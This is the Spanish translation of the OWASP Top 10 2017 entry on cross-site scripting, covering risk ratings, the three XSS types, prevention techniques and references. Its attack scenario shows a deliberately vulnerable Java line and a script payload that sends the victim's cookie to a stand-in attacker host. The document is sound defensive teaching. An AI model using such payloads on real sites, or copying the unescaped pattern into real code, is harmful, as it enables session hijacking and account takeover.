# A7:2017 Secuencia de Comandos en Sitios Cruzados (XSS)

| Agentes de amenaza/Vectores de ataque | Debilidades de seguridad         |      Impactos       |
| -- | -- | -- |
| Nivel de acceso : Explotabilidad 3    | Prevalencia 3 : Detectabilidad 3 | Técnico 2 : Negocio |
| Existen herramientas automatizadas pueden detectar y explotar las tres formas de XSS, y también se encuentran disponibles kits de explotación gratuitos. | XSS es la segunda vulnerablidad más frecuente en OWASP Top 10, y se encuentra en alrededor de dos tercios de todas las aplicaciones. Las herramientas automatizadas pueden detectar algunos problemas XSS en forma automática, particularmente en tecnologías maduras como PHP, J2EE / JSP, y ASP.NET. | El impacto de XSS es moderado para el caso de XSS Reflejado y XSS en DOM, y severa para XSS Almacenado, que permite ejecutar secuencias de comandos en el navegador de la víctima, para robar credenciales, secuestrar sesiones, o la instlación de software malicioso en el equipo de la víctima. |

## ¿Soy vulnetable a XSS?

Existen tres formas usuales de XSS para atacar a los navegadores de los usuarios:

* **XSS Reflejado**: La aplicación o API utiliza datos suministrados por un usuario sin ser validados o codificados apropiadamente como parte del HTML de salida o cuando no existe un cabezal que establezca la política de seguridad de contenido ([CSP](https://www.owasp.org/index.php/Content_Security_Policy)). Un ataque exitoso puede permitir al atacante ejecutar comandos arbitrarios HTML y Javascript en el navegador de la víctima. Típicamente el usuario deberá interactuar con un enlace, o alguna otra página controlada por el atacante, como un ataque del tipo pozo de agua, publicidad maliciosa, o similar.
* **XSS Almacenado**: La aplicación o API almacena datos proporcionados por el usuario sin validar ni sanear, la que posteriormente es entregada a otro usuario o un administrador. XSS Almacenado es usualmente considerado como de riesgo de nivel alto o crítico.
* **XSS Basados en DOM**: Frameworks en JavaScript, aplicaciones de página única o APIs que dinámicamente incluyen datos controlables por un atacante son vulnerables al DOM XSS. Idealmente, se debe evitar enviar datos controlables por el atacante a APIs no seguras.

Típicamente los ataques XSS incluyen el robo de la sesión, apropiación de la cuenta, evasión de autentificación de múltiples pasos, reemplazo de DIV o degradación (como troyanos de autentificación), ataques contra el navegador del usuario como la descarga de software malicioso, grabadores de tecleo, y otros tipos de ataques al lado cliente.


## ¿Como prevenirlo?

Prevenir XSS requiere mantener los datos no confiables separados del contenido activo del navegador.

* Utilizar marcos de trabajo seguros que por diseño automáticamente codifiquen el contenido para prevevenir XSS, como en Ruby 3.0 o React JS.
* Codificar datos de requerimientos HTTP no confiables en el contexto de la salida de HTML (cuerpo, atributos, JavaScript, CSS, o URL) resolverán las vulnerabilidades del tipo XSS Reflejado y XSS Almacenado. La hoja de trucos [OWASP XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) tiene detalles de las técnicas de codificación de datos requeridas.
* Aplicar codificación sensitiva al contexto cuando se modifica el documento en el navegador en el lado cliente, ayuda a prevevenir DOM XSS. Cuando esta técnica no se puede aplicar, técnicas similares de codificación sensitiva se pueden aplicar a las APIs del navegador, como se explica en la hoja de trucos [OWASP DOM based XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet).
* Habilitar una Política de Seguridad de Contenido [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) es una defensa profunda para la mitigación de vulnerabilidades XSS, asumiendo que no hay otras vulnerabilidades que permitan colocar código malicioso vía inclusión de archivos locales como sobreescritura de caminos (path traversal overwrite), o bibliotecas vulnerables de fuentes conocidas, como redes de distribución de contenidos (CDN) o bibliotecas locales.


## Ejemplos de escenarios de ataques

**Escenario #1**: La aplicación utiliza datos no confiables en la construcción del siguiente código HTML sin validarlos o codificarlos:

```
   (String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";
```

El atacante modifica el parámetro “CC” en el navegador a:

```
><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'.
```

Este ataque causa que el identificador de sesión de la víctima sea enviado al sitio web del atacante, permitiendo al atacante secuestrar la sesión actual del usuario.

**Note**: Atacantes pueden también utilizar XSS para anular cualquier defensa contra Falsificación de Peticiones en Sitios Cruzados (CSRF) que la aplicación pueda utilizar.

## Referencias (en Inglés)

### OWASP

* [OWASP Proactive Controls - #3 Encode Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
* [OWASP Proactive Controls - #4 Validate Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
* [OWASP Application Security Verification Standard - V5](https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project)
* [OWASP Testing Guide: Testing for Reflected XSS](https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001))
* [OWASP Testing Guide: Testing for Stored XSS](https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002))
* [OWASP Testing Guide: Testing for DOM XSS](https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001))
* [OWASP XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
* [OWASP DOM based XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)
* [OWASP XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)

### Externas

* [CWE-79 Improper neutralization of user supplied input](https://cwe.mitre.org/data/definitions/79.html)
* [PortSwigger: Client-side template injection](https://portswigger.net/knowledgebase/issues/details/00200308_clientsidetemplateinjection)
